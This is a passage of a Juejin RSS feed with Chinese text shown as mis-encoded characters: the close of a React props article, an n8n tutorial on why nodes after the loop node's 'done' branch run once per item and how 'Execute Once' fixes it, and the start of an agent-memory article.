<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>App</code>Â ç»„ä»¶ä½œä¸ºçˆ¶ç»„ä»¶ï¼Œé€šè¿‡Â <code>useState</code>Â ç®¡ç†Â <code>userName</code>Â çŠ¶æ€ï¼Œå¹¶å°†Â <code>userName</code>Â ä½œä¸ºÂ <code>name</code>Â å±æ€§ä¼ é€’ç»™Â <code>Greeting</code>Â å­ç»„ä»¶ã€‚<code>Greeting</code>Â å­ç»„ä»¶é€šè¿‡Â <code>props.name</code>Â æ¥æ”¶å¹¶å±•ç¤ºè¿™ä¸ªæ•°æ®ã€‚å½“ç”¨æˆ·ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œ<code>App</code>Â ç»„ä»¶æ›´æ–°Â <code>userName</code>Â çš„çŠ¶æ€ï¼Œ<code>Greeting</code>Â å­ç»„ä»¶ä¼šæ ¹æ®æ–°çš„Â <code>props</code>Â è‡ªåŠ¨æ›´æ–°æ˜¾ç¤ºã€‚</p>
<p>é€šè¿‡ç†è§£Â <code>props</code>Â çš„ç‰¹æ€§å’Œåœ¨ç»„ä»¶é€šä¿¡ä¸­çš„ä½œç”¨ï¼Œå¼€å‘è€…å¯ä»¥æ›´åŠ çµæ´»å’Œé«˜æ•ˆåœ°æ„å»º React åº”ç”¨ï¼Œå®ç°ç»„ä»¶ä¹‹é—´çš„è‰¯å¥½åä½œä¸æ•°æ®äº¤äº’ï¼Œæ‰“é€ å‡ºåŠŸèƒ½ä¸°å¯Œã€ç”¨æˆ·ä½“éªŒè‰¯å¥½çš„å‰ç«¯åº”ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¿å‘æŒ‡å—ï¼åˆ«å†è¢«N8Nå¾ªç¯èŠ‚ç‚¹â€œè°ƒæˆâ€äº†ï¼ä¸ºä»€ä¹ˆä½ çš„Doneåˆ†æ”¯æ‰§è¡Œäº†å¤šæ¬¡ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589074117644238883</link>    <guid>https://juejin.cn/post/7589074117644238883</guid>    <pubDate>2025-12-29T09:21:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644238883" data-draft-id="7588996730773192704" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" é¿å‘æŒ‡å—ï¼åˆ«å†è¢«N8Nå¾ªç¯èŠ‚ç‚¹â€œè°ƒæˆâ€äº†ï¼ä¸ºä»€ä¹ˆä½ çš„Doneåˆ†æ”¯æ‰§è¡Œäº†å¤šæ¬¡ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-29T09:21:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaä¸­æ–‡ç¤¾ç¾¤"/> <meta itemprop="url" content="https://juejin.cn/user/61228381386487"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             é¿å‘æŒ‡å—ï¼åˆ«å†è¢«N8Nå¾ªç¯èŠ‚ç‚¹â€œè°ƒæˆâ€äº†ï¼ä¸ºä»€ä¹ˆä½ çš„Doneåˆ†æ”¯æ‰§è¡Œäº†å¤šæ¬¡ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/61228381386487/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaä¸­æ–‡ç¤¾ç¾¤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:21:09.000Z" title="Mon Dec 29 2025 09:21:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶åœ¨ä½¿ç”¨ n8n çš„å¾ªç¯èŠ‚ç‚¹ï¼ˆLoop Over Itemsï¼‰æ—¶ï¼Œæœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§è®©äººæŠ“ç‹‚çš„æƒ…å†µï¼š</p>
<p>æ˜æ˜å®˜æ–¹æ–‡æ¡£è¯´ <code>loop</code> åˆ†æ”¯æ˜¯å¾ªç¯æ‰§è¡Œï¼Œè€Œ <code>done</code> åˆ†æ”¯æ˜¯åœ¨å¾ªç¯ç»“æŸååªæ‰§è¡Œä¸€æ¬¡ã€‚ç»“æœä½ è‡ªå·±ä¸€ä¸Šæ‰‹ï¼šå¥½å®¶ä¼™ï¼Œ<code>loop</code> è·‘äº† 3 æ¬¡ï¼Œ<code>done</code> åé¢æ¥çš„èŠ‚ç‚¹å±…ç„¶ä¹Ÿè·Ÿç€è·‘äº† 3 æ¬¡ï¼ğŸ¤¯ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/394b49df0671490eb6ef8e297a3c1b76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604868&amp;x-signature=HUcvPBGw8EaWlxuD4ePn1tP10JI%3D" alt="" loading="lazy"/></p>
<p><strong>éš¾é“æ˜¯å®˜æ–¹æ–‡æ¡£åœ¨å¿½æ‚ äººï¼Ÿè¿˜æ˜¯å’±ç”¨çš„ç‰ˆæœ¬ä¸å¯¹ï¼Ÿ</strong></p>
<p>ä»Šå¤©ï¼Œç£Šå“¥å°±å¸¦å¤§å®¶æ‰’ä¸€æ‰’ n8n åŸºç¡€èŠ‚ç‚¹é‡Œæœ€éš¾ç†è§£çš„â€”â€”å¾ªç¯èŠ‚ç‚¹ã€‚å…¨ç½‘æ²¡äººèƒ½è®²æ¸…çš„èƒŒåçš„é€»è¾‘ï¼Œå’±ä¸€æ¬¡æ€§è¯´æ˜ç™½ï¼</p>
<hr/>
<h2 data-id="heading-0">ğŸ¥ è§†é¢‘æ•™ç¨‹æ¼”ç¤º</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1odBCB7E6p%2F" target="_blank" title="https://www.bilibili.com/video/BV1odBCB7E6p/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1odâ€¦</a></p>
<hr/>
<h2 data-id="heading-1">ğŸ” 1. ç°åœºè¿˜åŸï¼šæ¶ˆå¤±çš„â€œä¸€æ¬¡æ‰§è¡Œâ€</h2>
<p>å’±ä»¬å…ˆçœ‹ä¸€ä¸ªç®€å•çš„æ¡ˆä¾‹ã€‚</p>
<p>åœ¨å·¥ä½œæµé‡Œï¼Œæˆ‘ç”¨ä»£ç èŠ‚ç‚¹ï¼ˆCode Nodeï¼‰è¾“å‡ºäº†ä¸‰é¡¹å†…å®¹ï¼šå¼ ä¸‰ã€æå››ã€ç‹äº”ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1cbf06433c546299fc165f627c42b67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604868&amp;x-signature=GM2lJf4iXWsGHVBtx5JOgV%2Fx3jo%3D" alt="" loading="lazy"/></p>
<p>æŒ‰é€»è¾‘ï¼Œæ¥ä¸‹æ¥çš„å¾ªç¯èŠ‚ç‚¹åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a41fe085f1d4ef49da0bdd4d093278a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604868&amp;x-signature=yCdpvLtmcXZ9Bs79L95Wfzi8h7o%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>loop åˆ†æ”¯</strong>ï¼šè´Ÿè´£å¾ªç¯è¿™ä¸‰é¡¹ï¼Œå»æ‰§è¡Œå…·ä½“çš„ä»»åŠ¡ï¼ˆæ¯”å¦‚å†™å…¥æ–‡ä»¶ï¼‰ã€‚</li>
<li><strong>done åˆ†æ”¯</strong>ï¼šç­‰è¿™ä¸‰é¡¹éƒ½å¤„ç†å®Œäº†ï¼Œ<strong>å‡ºæ¥å±ä¸€å£°ï¼ˆæ‰§è¡Œä¸€æ¬¡ï¼‰</strong>ï¼Œæ”¶ä¸ªå°¾ã€‚</li>
</ol>
<p>ä½†åœ¨å®é™…æ‰§è¡Œä¸­ï¼Œä½ ä¼šå‘ç° <code>loop</code> ä¸‹é¢æ˜¾ç¤º â€œ3 itemsâ€ï¼Œ<strong>è€Œ <strong><code>**done**</code></strong> ä¸‹é¢ä¹Ÿæ˜¾ç¤ºäº† â€œ3 itemsâ€</strong>ã€‚</p>
<p>å¦‚æœä½ åœ¨ <code>done</code> åé¢æ¥ä¸ªå‘é‚®ä»¶æˆ–è€…å†™æ–‡ä»¶çš„èŠ‚ç‚¹ï¼Œå®ƒä¼šæ•´æ•´è¿è¡Œ 3 æ¬¡ï¼</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45c05518443a449eb7413ddb0299c1c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604868&amp;x-signature=i%2FBr78ZCPfAKmXK1uWyvORRwCXA%3D" alt="" loading="lazy"/></p>
<p>è¿™åˆ°åº•æ˜¯ä¸ºä»€ä¹ˆï¼ŸğŸ¤”</p>
<hr/>
<h2 data-id="heading-2">ğŸ’¡ 2. æ ¸å¿ƒçœŸç›¸ï¼šæ˜¯â€œç»“æœâ€è·‘äº†å¤šæ¬¡ï¼Œè€Œä¸æ˜¯â€œäº‹ä»¶â€è·‘äº†å¤šæ¬¡</h2>
<p>è¿™é‡Œå¤§å®¶ä¸€å®šè¦è®°ä½ä¸€å¥è¯ï¼šåœ¨ n8n é‡Œï¼Œåç»­èŠ‚ç‚¹æ‰§è¡Œå‡ æ¬¡ï¼Œå–å†³äºå‰ä¸€ä¸ªèŠ‚ç‚¹è¾“å‡ºäº†å¤šå°‘ä¸ª Itemï¼ˆé¡¹ç›®ï¼‰ã€‚</p>
<p>è¿™å°±æ˜¯å¾ˆå¤šäººç†è§£ä¸äº†å¾ªç¯èŠ‚ç‚¹çš„æ ¹æœ¬åŸå› ã€‚</p>
<ul>
<li><strong>å®˜æ–¹æ²¡éª—ä½ </strong>ï¼š<code>done</code> åˆ†æ”¯ç¡®å®åªè¢«è§¦å‘äº†ä¸€æ¬¡ã€‚</li>
<li><strong>çœŸç›¸æ˜¯</strong>ï¼š<code>done</code> äº‹ä»¶åœ¨æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šæŠŠä¹‹å‰ <code>loop</code> å¾ªç¯å®Œæˆçš„æ‰€æœ‰ç»“æœï¼ˆé‚£ 3 æ¡æ•°æ®ï¼‰å°è£…åœ¨ä¸€èµ·åå‡ºæ¥ã€‚</li>
</ul>
<p><strong>å› ä¸º <strong><code>done</code></strong> åˆ†æ”¯è¾“å‡ºäº† 3 ä¸ªé¡¹ç›®</strong>ï¼Œn8n çš„é»˜è®¤é€»è¾‘å°±æ˜¯ï¼šâ€œæ—¢ç„¶ä½ æœ‰ 3 æ¡æ•°æ®ï¼Œ<strong>é‚£åé¢çš„èŠ‚ç‚¹æˆ‘å°±å¹¶è¡Œçš„å¸®ä½ è·‘ 3 æ¬¡å§ï¼</strong>â€</p>
<p>æ‰€ä»¥ï¼Œ<strong>ä½ çœ‹åˆ°çš„â€œæ‰§è¡Œå¤šæ¬¡â€ï¼Œå…¶å®æ˜¯ n8n å¼ºå¤§çš„å¹¶å‘ç‰¹æ€§å¯¼è‡´çš„â€œå‡è±¡â€</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-3">ğŸ› ï¸ 3. ç»ˆæç»æ‹›ï¼šå¦‚ä½•è®© Done åªä¹–ä¹–æ‰§è¡Œä¸€æ¬¡ï¼Ÿ</h2>
<p>æ—¢ç„¶çŸ¥é“äº†åŸå› ï¼Œè§£å†³èµ·æ¥å°±éå¸¸ç®€å•äº†ã€‚</p>
<p>å¦‚æœä½ å¸Œæœ›å¾ªç¯ç»“æŸåï¼Œåç»­èŠ‚ç‚¹ä¸ç®¡å‰é¢æœ‰å¤šå°‘é¡¹æ•°æ®ï¼Œéƒ½åªè¿è¡Œä¸€æ¬¡ï¼Œä½ åªéœ€è¦ï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f077f997a32461eb4452659667c6b50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604868&amp;x-signature=iy5KdcSVp7WNaqfphOIaBthyzlA%3D" alt="" loading="lazy"/></p>
<ol>
<li>æ‰“å¼€ <code>done</code> åˆ†æ”¯åçš„é‚£ä¸ªèŠ‚ç‚¹è®¾ç½®ã€‚</li>
<li>ç‚¹å‡» Settings é€‰é¡¹å¡ã€‚</li>
<li>æ‰¾åˆ° Execute Once é€‰é¡¹ï¼ŒæŠŠå®ƒæ‰“å¼€ï¼âœ…</li>
</ol>
<p>å¼€å¯è¿™ä¸ªå¼€å…³åï¼Œæ— è®ºå‰é¢ä¼ è¿‡æ¥ 3 æ¡è¿˜æ˜¯ 3000 æ¡æ•°æ®ï¼Œè¿™ä¸ªèŠ‚ç‚¹éƒ½åªä¼šæ‰§è¡Œä¸€æ¬¡ã€‚è¿™æ‰æ˜¯ç¬¦åˆæˆ‘ä»¬é¢„æœŸçš„â€œå¾ªç¯ç»“æŸâ€åŠ¨ä½œï¼Œæœ€ç»ˆæ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4bf74e4162d456b938d55428a054ad9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604868&amp;x-signature=mFoQSq1s%2F4YV7TW3%2FE2N6qtbbss%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-4">æœ€åæ€»ç»“ ğŸ“</h2>
<p>ç†è§£äº† â€œItem é©±åŠ¨æ‰§è¡Œâ€ è¿™ä¸ªé€»è¾‘ï¼Œä½ æ‰ç®—çœŸæ­£è¸å…¥äº† n8n é«˜çº§ç©å®¶çš„å¤§é—¨ã€‚</p>
<ul>
<li><strong>loop</strong>ï¼šè¿‡ç¨‹åˆ†æ”¯ï¼Œå¾ªç¯å‡ æ¬¡è·‘å‡ æ¬¡ã€‚</li>
<li><strong>done</strong>ï¼šç»“æŸåˆ†æ”¯ï¼Œåªè§¦å‘ä¸€æ¬¡ï¼Œä½†ä¼šæºå¸¦æ‰€æœ‰ç»“æœã€‚</li>
<li><strong>Execute Once</strong>ï¼šæ‹¦æˆªå¤šä½™æ‰§è¡Œçš„â€œå®šæµ·ç¥é’ˆâ€ã€‚</li>
</ul>
<p>å¦‚æœä½ è§‰å¾—è¿™ç¯‡å¹²è´§æœ‰å¸®åˆ°ä½ ï¼Œè®°å¾—ç‚¹èµã€åœ¨çœ‹ï¼</p>
<p>æˆ‘æ˜¯ç£Šå“¥ï¼Œæ¯å¤©åˆ†äº«ä¸€ä¸ª n8n å®æˆ˜å¹²è´§ï¼Œå’±ä»¬ä¸‹æœŸè§ï¼ğŸ‘‹</p>
<blockquote>
<p>æœ¬æ–‡å·²æ”¶å½•åˆ°æˆ‘çš„æŠ€æœ¯å°ç«™ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.javacn.site" target="_blank" title="https://www.javacn.site" ref="nofollow noopener noreferrer">www.javacn.site</a>ï¼Œç½‘ç«™åŒ…å«çš„å†…å®¹æœ‰ï¼š<strong>LangChain/N8N/SpringAI/SpringAIAlibaba/LangChain4j/Dify/Coze/AIå®æˆ˜é¡¹ç›®/AIå¸¸è§é¢è¯•é¢˜</strong>ç­‰æŠ€æœ¯åˆ†äº«ï¼Œæ¬¢è¿å„ä½å¤§ä½¬å…‰ä¸´æŒ‡å¯¼~</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Agent è®°å¿†ç³»ç»ŸæŠ€æœ¯æ·±åº¦ï¼šä»ä¸Šä¸‹æ–‡å·¥ç¨‹åˆ°é•¿æœŸè®°å¿†ç»„ä»¶é›†æˆï¼]]></title>    <link>https://juejin.cn/post/7589126217249833001</link>    <guid>https://juejin.cn/post/7589126217249833001</guid>    <pubDate>2025-12-29T09:21:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217249833001" data-draft-id="7589126217249456169" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Agent è®°å¿†ç³»ç»ŸæŠ€æœ¯æ·±åº¦ï¼šä»ä¸Šä¸‹æ–‡å·¥ç¨‹åˆ°é•¿æœŸè®°å¿†ç»„ä»¶é›†æˆï¼"/> <meta itemprop="keywords" content="Agent"/> <meta itemprop="datePublished" content="2025-12-29T09:21:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Agent è®°å¿†ç³»ç»ŸæŠ€æœ¯æ·±åº¦ï¼šä»ä¸Šä¸‹æ–‡å·¥ç¨‹åˆ°é•¿æœŸè®°å¿†ç»„ä»¶é›†æˆï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:21:07.000Z" title="Mon Dec 29 2025 09:21:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body 